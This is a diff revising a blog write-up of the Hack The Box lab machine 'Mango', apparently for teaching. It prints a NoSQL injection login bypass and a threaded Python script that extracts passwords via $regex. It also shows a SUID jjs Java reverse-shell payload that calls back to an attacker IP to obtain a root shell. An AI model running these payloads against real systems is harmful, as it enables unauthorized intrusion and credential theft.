@@ -7,13 +7,17 @@ published: false
 ![](/assets/Mango/Mango.png)
 
 ## Summary
-- Mango is a great Linux box where both an HTTP and HTTPS websites are hosted.
-- The SSL certificate on the HTTPS website reveals another virtual host which we visit on both port 80 and 443.
-- The HTTP version has a login page which happened to vulnerable to noSQL injection.
-- After logging in with an authentication bypass, we find the site still under construction. So we instead use the built-in regex functionality to retrieve any usernames and passwords on the web app.
-- Since that process can take a long time, we create a Python script to automate the process and further develop it for multi-threading support.
-- Running the script gives us credentials for two usernames: `admin` and `mango`. The `mango` user had SSH access which we used to get a shell on the box.
-- When checking for SUID binaries, we came across a tool called `jjs` which we exploited with the help of GTFOBins to become `root`.
+- **Mango** is a **Linux box** where both **HTTP and HTTPS websites** are hosted.
+- *While inspecting it,* the site's **SSL certificate** revealed another **virtual host.**
+- That **vhost** had a **login page** on the **home page of its HTTP port** which happened to **vulnerable to NoSQL injection.**
+- *After logging in with* ***an authentication bypass,*** we found the site ***still under construction.***
+- *Without any functionality to abuse,* we turn to **NoSQL's built-in regex capability** to **enumerate the usernames and passwords** on the web app ***in hopes of reusing them with SSH.***
+- *Since* ***retrieving passwords manually*** *was time consuming,* we **wrote a Python script** to **automate the process** and **further developed it** for **multi-threading support** ***(it ran 9X faster.)***
+- We were able to get **credentials for two usernames**: `admin` and `mango`. The `mango` user had **SSH access** which we leveraged to access the box.
+- *From inside,* we could **pivot** to the `admin` user using `su` because ***the password was the same.***
+- *While trying to* ***escalate our privileges***, we found an **SUID binary** called `jjs` which we **exploited** with the help of [GTFOBins](https://gtfobins.github.io/) to become `root`.
+
+---
 
 ## NMAP
 ```
@@ -35,127 +39,145 @@ published: false
 |_  http/1.1
 |_ssl-date: TLS randomness does not represent time
 ```
-from the nmap port scan, we see the 22, 80 & 443 ports open.
+*From the* `nmap` *port scan,* we see **SSH, HTTP & HTTPS** ports open.
 
-But we also notice that the `ssl-cert` script shows us a virtual host: staging-order.mango.htb
+But we also notice that the `ssl-cert` script shows a **virtual host**: `staging-order.mango.htb`
 
-## Checking the Websites and the Virtual Hosts
-We add an entry for both the TLD `mango.htb` and the `staging-order.mango.htb` subdomain in our `/etc/hosts` file
+## Checking the Websites
+*To handle* ***Virtual Host Routing,*** We **add an entry** in our `/etc/hosts` file for both the **TLD** `mango.htb` and the `staging-order.mango.htb` **subdomain**.
 
 ![](/assets/Mango/etc-hosts.jpg)
 
-Visting the `mango.htb` only gets us a valid web page on the HTTPS site.
+visting `mango.htb` only gets us a **valid page** on the **HTTPS site**. *as we've seen from* `nmap`*'s output,* the **HTTP** one gives back a **403 forbidden response.**
 
 ![](/assets/Mango/mango-htb-sites.jpg)
 
-To test for SQL Injeciton, we intercept the search request and save it to a file
+The **search function** suggests testing for **SQL Injection**. *To do so,* we **intercept the request** and **save it to a file**
 
 ![](/assets/Mango/search-sqli-request.jpg)
 
-then pass it to `sqlmap` using the `-r` flag as well as the `--force-ssl` flag to target HTTPS
+then pass it to `sqlmap` using the `-r` flag as well as the `--force-ssl` flag to **target the HTTPS URL.**
 
 ![](/assets/Mango/sqlmap-search.jpg)
 
-this doesn't yield any results.
+Doing this ***doesn't yield back any results :/***
 
-we attempted to look for any function abuse in the analytics.php page.
+*Afterward,* we attempted to **abuse any of the available functions** in the `analytics.php` page. (***like checking for SSRF***)
 
 ![](/assets/Mango/analytics-page-testing.jpg)
 
-but we didn't finding much there as well.
+*but without no luck there as well.*
 
-However, there was a login page on the HTTP version of the `staging-order.mango.htb` virtual host.
+*Moving on, we look at the* **HTTP version** *of the* `staging-order.mango.htb` *virtual host,* we found a **login page.**
 
 ![](/assets/Mango/http-subdomain.jpg)
 
-When intercepting the request, we attempt injecting common SQL Injection payloads but they don't work.
+*After intercepting the request,* we attempted injecting **common SQL Injection payloads** but they *didn't work.*
 
-So intead, we try NoSQL authentication bypasses using the not equal `$ne` directive.
+*So intead,* we tried **NoSQL authentication bypasses** using the not equal (`$ne`) directive.
 
-by setting both the username and password to values we're sure don't exist in the database (ex: test/test), the check should evaluate to true and let us log in.
+*By setting* ***both the username and password*** *to* ***values we're sure don't exist in the database*** *(ex: test/test),* the check **should evaluate to** `true` and let us log in.
 
 ![](/assets/Mango/nosqli-auth-bypass.jpg)
 
-we get a 302 redirect. which we follow to get redirected to this page:
+**It worked!** and we got a **302 response.** which we followed to get **redirected to this page:**
 
 ![](/assets/Mango/login-success-page.jpg)
 
-we get a username here: `admin`
+we get a **potential username** here: `admin`
 
-but there's nothing to played with in this page.
+*other than that, there was nothing to played with on this page.*
 
-## Exploiting the NoSQL Injection to Get Credentials
+## Exploiting NoSQL Injection to Get Credentials
 
-Still, having a NoSQL injection means we can use the `$regex` directive to enumerate any usernames and passwords.
+***Still,*** having a **NoSQL Injection** means we can ***abuse*** the `$regex` directive to **enumerate any usernames/passwords.**
 
-Our plan here is obtain those and try them with SSH to exploit any reuse of credentials
+Our plan here is to **obtain creds** and **try them with SSH** to **exploit any reuse.**
 
-To get the first character of the `admin` user's password, we can supply a regular expression like `^a`.
+*To check the* ***first character*** *of the* `admin` *user's password,* we can **supply a regular expression** like:
 
-This regex would evaluate if the passwords starts with the letter "a".
+```
+username=admin&password[$regex]=^a
+```
 
-- if true, we would get the 302 redirect and get authenticated.
-- if false, we should get a different response.
+The above regex would ***be evaluated*** to see if the **password starts** with the letter "a" or not.
 
-let's give it a try:
+- ***if the condition is true,*** we would get the **302 redirect** and **get authenticated.**
+- ***if false,*** we should get a ***different response.***
+
+Let's **give it a try** using **Burp**
 
 ![](/assets/Mango/nosql-enum-incorrect-first-letter.jpg)
 
-we got a 200 OK, this means that the password doesn't start with the letter "a".
+we get a **200 OK**. this likely means that **the password doesn't start with the letter "a".**
 
-the response is a 302 redirect when we put the first letter as "t". which means it's the first character of the `admin` user's password
+***But, when trying different letters...***
 
 ![](/assets/Mango/nosql-enum-correct-first-letter.jpg)
 
-Finding the password for the admin user can take a long time if done manually.
+the response is a **302 redirect** when we put the first letter as "t". which means it's **the first character** of the `admin` user's password.
 
-That's why, we wrote a Python script to automate the process and used multi-threading to make it faster. Here's the code:
+Doing this process ***manually*** can take a lot of time. That's **especially true with passwords** since we have to **test all uppercase/lowercase letters in addition to all digits and symbols.**
 
-Note:
-- We commented all parts of the script. you're advised to read them to figure out how everything works.
-- Also, you will notice another user called `mango` there. we enumerated it using the method above and added to the script.
+*That's why,* we **wrote a Python script** to ***automate the process*** and ***even used multi-threading*** to **make it go faster**.
 
+**Note:**
+- *For brevity,* the code below is **mainly for obtaining passwords**. But the ***same concept applies to enumerating usernames (the code for that is commented out).***
+- I **put comments** to **explain the script** at every point. you're **advised to read those** to **figure out the logic.**
+- *Lastly,* I **divided the script** into **three parts** to **make it easier to grasp.**
+
+### The 1st Part: Importing the required libraries and the "test" function
 ```python
 from threading import Thread
-import string
+import string # includes the needed character sets
 import requests
 
-# function that takes in a character as input and tests if the password starts with it or not
+# a function that takes in a character as input and tests if the password starts with it or not
 def test(character, username):
+	# the password variable is defined globally to be accessible everywhere and to be populated
 	global password
-	# regular expression payload, notice that we keep appending the character in question to the end of the already found password
+	# the regex payload, notice that we keep appending the character in question to the end of the already discovered part of the password
 	payload = f"^{password}{character}"
 	url = 'http://staging-order.mango.htb/'
-	# filling out the post data
+	# filling out the post data with the supplied username and character
 	data = {
 		'username': username,
 		'password[$regex]': payload,
 		'login': 'login'
 	}
+	"""
+	# here's the post data if you want to enumerate usernames
+	data = {
+		'username[$regex]': payload,
+		'password[$ne]': '',
+		'login': 'login'
+	}
+	"""
 	# special print function for a cool effect
 	print ("\r" + "[*] the password for " + username + " is... " + password + str(character), flush=False, end='')
-	# sending the request
+	# sending the request without following redirects
 	response = requests.post (url=url, data=data, allow_redirects=False)
 	# return true if the status code is the 302 redirection
 	if response.status_code == 302:
 		return True
 
-# the below are worker functions written to distribute all the possible characters equally among their threads
-
-# 1st half of the alphabet (lowercase)
+```
+### The 2nd Part: Creating the worker functions (7 total) to evenly distribute and iterate over all characters in parallel
+```python
+# 1st half of the lowercase alphabet (13 total)
 def alpha_L1():
-	# the catch variable represents a valid character found, this is useful for stopping all workers when a match is found instead of contuining to search
+	# the catch variable represents a valid character found, this is used for stopping all workers when a match is found instead of continuing to search
 	global catch
 	for character in string.ascii_letters[0:13]:
-		# if the catch variable isn't empty, stop searching and return
+		# if the catch variable isn't empty (i.e another worker caught the right character), be a smart worker and stop searching ;]
 		if catch != '':
 			return
-		# if the test function returns true, set the catch variable and break out of the loop
+		# if the test function returns true, set the catch variable and stop searching :D
 		if test(character, target_user):
 			catch = character
 			break
 
-# 2nd half of the alphabet (lowercase)
+# 2nd half of the lowercase alphabet (13 total)
 def alpha_L2():
 	global catch
 	for character in string.ascii_letters[13:26]:
@@ -165,7 +187,7 @@ def alpha_L2():
 			catch = character
 			break
 
-# 1st half of the alphabet (uppercase)
+# 1st half of the uppercase alphabet (13 total)
 def alpha_U1():
 	global catch
 	for character in string.ascii_letters[26:39]:
@@ -175,7 +197,7 @@ def alpha_U1():
 			catch = character
 			break
 
-# 2nd half of the alphabet (uppercase)
+# 2nd half of the uppercase alphabet (13 total)
 def alpha_U2():
 	global catch
 	for character in string.ascii_letters[39:53]:
@@ -185,7 +207,7 @@ def alpha_U2():
 			catch = character
 			break
 
-# numbers
+# numbers (10 total)
 def numbers():
 	global catch
 	for digit in string.digits:
@@ -195,20 +217,20 @@ def numbers():
 			catch = digit
 			break
 
-# 1st half of symbols
+# 1st half of symbols (16 total)
 def symbols_1():
 	global catch
 	for symbol in string.punctuation[0:16]:
 		if catch != '':
 			return
-		# these symbols are escaped because they have connotations in regular expressions
+		# these symbols are escaped because they have connotations in the regular expressions language
 		if symbol in ['^', '.', '*', '+', '?', '|', '$', '\\']:
 			symbol = f"\\{symbol}"
 		if test(symbol, target_user):
 			catch = symbol
 			break
 
-# 2nd half of symbols
+# 2nd half of symbols (16 total)
 def symbols_2():
 	global catch
 	for symbol in string.punctuation[16:33]:
@@ -219,16 +241,18 @@ def symbols_2():
 		if test(symbol, target_user):
 			catch = symbol
 			break
-
-
+```
+### The 3rd Part: Starting the workers and letting them retrieve the passwords for both usernames
+```python
+# we target both the admin and the mango users, we enumerated the latter using the alternative code above in the test function
 target_users = ["admin", "mango"]
 
-# foreach user, start with an empty password and catch variables
+# foreach user, start with an empty password/catch variables
 for target_user in target_users:
 	password = ""
 	catch = ""
 
-	# append worker functions to the threads array
+	# add each of worker functions to the threads array
 	while True:
 		threads = []
 		t = Thread(target = alpha_L1)
@@ -254,10 +278,10 @@ for target_user in target_users:
 		for worker in threads:
 			worker.join()
 
-		# if there was no catch, break because that means we have the password
+		# if there was no catch, break because that means we have the complete password
 		if catch == "":
 			break
-		# if there was a catch, append it the password and clear the variable
+		# if there was a catch, append it to the password and clear out the variable
 		password += catch
 		catch = ""
 
@@ -265,47 +289,55 @@ for target_user in target_users:
 	print ("\r" + "[+] the password for " + target_user + ": " + password.ljust(25))
 ```
 
-here's what the script looks like during run-time:
+Here's ***what the script looks like during run-time:***
 
 ![](/assets/Mango/getting-passwords.gif)
 
-this version finished enumerating the passwords in 1 minute and 5 seconds.
+**pretty cool, huh? :]**
+
+***to compare its performance,*** we prepended the `time` command to both scripts.
+
+This version **finished enumerating both passwords** in **1 minute and 5 seconds.**
 
 ![](/assets/Mango/time-for-multi-threaded-python-script.jpg)
 
-which is a huge improvement from the single-threaded version which needed almost 9 minutes.
+which is a **huge improvement** from the **single-threaded version** which **needed almost 9 minutes!**
 
 ![](/assets/Mango/time-for-single-threaded-python-script.jpg)
 
 
-## SSH as the Mango user
-when trying to log in as `admin`, we didn't gain access. The `mango` user worked though:
+## Gaining Foothold and Pivoting
+*Moving on,* *when we tried to log in as* `admin`, it didn't work. The `mango` user had access though.
 
 ![](/assets/Mango/ssh-as-mango.jpg)
 
-we could pivot to the `admin` user however after logging in:
+*From inside,* we could **pivot** to the `admin` user with `su`.
 
 ![](/assets/Mango/pivot-to-admin-user.jpg)
 
 ## SUID Privilege Escalation
 
-Running the `find` command below:
+*Looking for easy setuid wins,* We ran the `find` command below:
 
 ```bash
-find / -type f -perm -u=s -ls 2>/dev/null
+find / -perm -u=s -ls 2>/dev/null
 ```
 
-we run into a strange binary with the SUID bit set:
+and found a **strange binary** called `jjs` with the **SUID bit** set:
 
 ![](/assets/Mango/jjs-suid-found.jpg)
 
-automatically, we search for any abuses for it on [GTFOBins](/assets/Mango/https://gtfobins.github.io/gtfobins/jjs/)
+We **looked it up** and found the below **description** on [Oracle Docs](https://docs.oracle.com/en/java/javase/13/docs/specs/man/jjs.html). It was **exactly what we needed** ***\*evil smile\****
+
+![](/assets/Mango/jjs-command.jpg)
+
+*To check for ways to exploit it,* we searched [GTFOBins](https://gtfobins.github.io/gtfobins/jjs/) and found the below:
 
 ![](/assets/Mango/jjs-on-gtfo-bins.jpg)
 
-seems pretty straight-forward. so we start our listener on port 9000 and set the environment variables over on the victim machine.
+Seems **pretty straightforward**. A **standard Java reverse shell payload**.
 
-Note: to inherit the permissions from the `jjs` binary, we modified the payload on the 6th line to be `bash` with the `-p` flag. it would be like below:
+**An Important Note:** *to* ***inherit the permissions*** *from the* `jjs` *binary and* ***get code execution as*** `root`, we have to **modify the payload** on the **6th line** and call `bash` with the `-p` flag instead.
 
 ```bash
 export RHOST=10.10.16.9
@@ -320,6 +352,8 @@ var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
 var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 ```
 
+we start our `ncat` listener and **set the required environment variables** over on the victim machine before **executing the shell.**
+
 ![](/assets/Mango/rooted.jpg)
 
-from the effective UID `euid=0(root)` we know we rooted the box :D
+*from the effective UID* `euid=0(root)`, we're now acting as `root` :)
